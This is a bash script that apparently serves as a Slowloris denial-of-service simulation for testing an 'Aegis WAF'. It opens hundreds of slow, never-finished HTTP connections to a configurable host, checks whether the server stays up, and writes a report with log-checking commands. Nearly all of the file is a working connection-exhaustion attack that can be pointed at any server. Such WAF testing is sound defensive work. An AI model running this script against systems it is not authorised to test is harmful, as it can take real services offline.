#!/usr/bin/env bash
set -euo pipefail

SCRIPT_NAME="${0##*/}"
TARGET_HOST="${AEGIS_TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${AEGIS_TARGET_PORT:-8443}"
NUM_CONNECTIONS="${AEGIS_CONNECTIONS:-200}"
HEADER_INTERVAL="${AEGIS_HEADER_INTERVAL:-10}"
TEST_DURATION="${AEGIS_DURATION:-60}"
REPORT_FILE="slowloris_report_$(date +%Y%m%d_%H%M%S).txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*"; }
log_stat()  { echo -e "${CYAN}[STAT]${NC}  $*"; }

ACTIVE_PIDS=()
SOCKETS_OPEN=0
SOCKETS_TOTAL=0

cleanup() {
    log_info "Cleaning up $ACTIVE_CONN_COUNT connections..."

    for pid in "${ACTIVE_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done

    wait 2>/dev/null || true
    log_info "Cleanup complete."
}
trap cleanup EXIT INT TERM

slowloris_connection() {
    local id="$1"
    local host="$2"
    local port="$3"
    local interval="$4"
    local duration="$5"

    local sent_req=false
    local total_headers=0
    local connected=false
    local start_epoch
    start_epoch=$(date +%s)

    exec 3<>"/dev/tcp/$host/$port" 2>/dev/null || {
        echo "CONN:$id:FAIL:connect"
        return 1
    }
    connected=true
    echo "CONN:$id:OPEN"

    printf "GET / HTTP/1.1\r\n" >&3
    printf "Host: %s\r\n" "$host" >&3
    total_headers=2

    while true; do
        local now_epoch
        now_epoch=$(date +%s)
        if (( now_epoch - start_epoch >= duration )); then
            echo "CONN:$id:CLOSE:timeout $total_headers headers"
            break
        fi

        local header_name="X-Aegis-Slow-${id}-${total_headers}"
        printf "%s: %s\r\n" "$header_name" "keep-alive-connection-test-data-${id}" >&3
        total_headers=$((total_headers + 1))

        sleep "$interval"
    done

    printf "\r\n" >&3 2>/dev/null || true
    exec 3>&- 2>/dev/null || true

    echo "CONN:$id:DONE headers=$total_headers"
}

monitor_connections() {
    local interval=2

    while true; do
        local active
        active=$(jobs -r 2>/dev/null | wc -l || echo 0)
        log_stat "Active connections: $active / $NUM_CONNECTIONS"

        sleep "$interval"
    done
}

run_responsiveness_check() {
    local label="$1"
    local timeout=5

    log_info "Responsiveness check [$label]: GET https://$TARGET_HOST:$TARGET_PORT/health"

    local result
    if result=$(curl -k -s -o /dev/null -w "%{http_code}" \
        --max-time "$timeout" \
        "https://$TARGET_HOST:$TARGET_PORT/health" 2>/dev/null); then
        log_info "Response code: $result"
        if [[ "$result" == "200" ]]; then
            log_info "Server responsive [$label]"
        else
            log_warn "Server returned $result (may indicate WAF is active) [$label]"
        fi
    else
        log_warn "Server unreachable (connection exhaustion possible) [$label]"
    fi
}

generate_report() {
    local start_time="$1"
    local end_time="$2"
    local pre_check_ok="$3"
    local mid_check_ok="$4"
    local post_check_ok="$5"

    {
        echo "=========================================="
        echo " Aegis WAF Slowloris Attack Simulation Report"
        echo "=========================================="
        echo " Generated: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        echo ""
        echo " Test Configuration"
        echo "-------------------"
        echo " Target:          $TARGET_HOST:$TARGET_PORT"
        echo " Connections:     $NUM_CONNECTIONS"
        echo " Header Interval: ${HEADER_INTERVAL}s"
        echo " Test Duration:   ${TEST_DURATION}s"
        echo ""
        echo " Test Timeline"
        echo "-------------"
        echo " Start:           $start_time"
        echo " End:             $end_time"
        echo " Pre-check:       $([ "$pre_check_ok" == "true" ] && echo "Server responsive" || echo "Server NOT responsive")"
        echo " Mid-check:       $([ "$mid_check_ok" == "true" ] && echo "Server responsive" || echo "Server NOT responsive")"
        echo " Post-check:      $([ "$post_check_ok" == "true" ] && echo "Server responsive" || echo "Server NOT responsive")"
        echo ""
        echo " Slowloris Detection Indicators"
        echo "-------------------------------"
        echo " [ ] Aegis detected slow header transmission"
        echo " [ ] Protocol validator triggered SlowlorisDetected warning"
        echo " [ ] Connection timeout enforced (connections closed before duration)"
        echo " [ ] Max connections limit enforced"
        echo " [ ] Legitimate requests still served during attack"
        echo ""
        echo " WAF Verification Commands"
        echo "--------------------------"
        echo " # Check Aegis logs for Slowloris-related entries:"
        echo " grep -i slowloris /var/log/aegis-waf/*.log"
        echo ""
        echo " # Check response engine escalation for the attack IP:"
        echo " grep 'escalation' /var/log/aegis-waf/*.log"
        echo ""
        echo " # Verify connection limits:"
        echo " grep -i 'connection_limit' /var/log/aegis-waf/*.log"
        echo ""
        echo " Summary"
        echo "-------"
        echo " The Slowloris attack attempts to exhaust server connections"
        echo " by sending HTTP headers very slowly. Aegis WAF should detect"
        echo " this through the ProtocolValidator and rate limiter."
        echo ""
        if [[ "$post_check_ok" == "true" ]]; then
            echo " RESULT: Server remained responsive - WAF mitigated the attack"
        else
            echo " RESULT: Server became unresponsive - attack may have succeeded"
        fi
        echo "=========================================="
    } > "$REPORT_FILE"

    log_info "Report saved to $REPORT_FILE"
}

main() {
    log_info "=== Aegis WAF Slowloris Attack Simulation ==="
    log_info "Target: $TARGET_HOST:$TARGET_PORT"
    log_info "Connections: $NUM_CONNECTIONS | Header Interval: ${HEADER_INTERVAL}s | Duration: ${TEST_DURATION}s"
    log_info "================================================"

    PRE_CHECK_OK=true
    run_responsiveness_check "pre-attack" || PRE_CHECK_OK=false

    START_TIME=$(date -u '+%Y-%m-%d %H:%M:%S')
    START_EPOCH=$(date +%s)

    monitor_connections &
    MONITOR_PID=$!

    ACTIVE_CONN_COUNT=0
    local batch_size=20
    local interval_secs="${HEADER_INTERVAL}"

    for ((batch_start=1; batch_start<=NUM_CONNECTIONS; batch_start+=batch_size)); do
        batch_end=$((batch_start + batch_size - 1))
        if ((batch_end > NUM_CONNECTIONS)); then
            batch_end=$NUM_CONNECTIONS
        fi

        for ((i=batch_start; i<=batch_end; i++)); do
            slowloris_connection "$i" "$TARGET_HOST" "$TARGET_PORT" "$interval_secs" "$TEST_DURATION" &
            ACTIVE_PIDS+=($!)
            ACTIVE_CONN_COUNT=$i
        done

        if (( ACTIVE_CONN_COUNT >= NUM_CONNECTIONS / 2 )) && (( ACTIVE_CONN_COUNT - batch_end < NUM_CONNECTIONS / 2 )); then
            sleep 2
            MID_CHECK_OK=true
            run_responsiveness_check "mid-attack ($ACTIVE_CONN_COUNT connections)" || MID_CHECK_OK=false
        fi

        sleep 1
    done

    log_info "All $NUM_CONNECTIONS slow connections established."

    local remaining=$((TEST_DURATION - (NUM_CONNECTIONS / batch_size)))
    if ((remaining > 0)); then
        log_info "Waiting ${remaining}s for remaining test duration..."
        sleep "$remaining"
    fi

    kill "$MONITOR_PID" 2>/dev/null || true

    END_TIME=$(date -u '+%Y-%m-%d %H:%M:%S')

    POST_CHECK_OK=true
    run_responsiveness_check "post-attack" || POST_CHECK_OK=false

    log_info "=== Slowloris Test Complete ==="

    generate_report "$START_TIME" "$END_TIME" "$PRE_CHECK_OK" "${MID_CHECK_OK:-false}" "$POST_CHECK_OK"
}

main "$@"
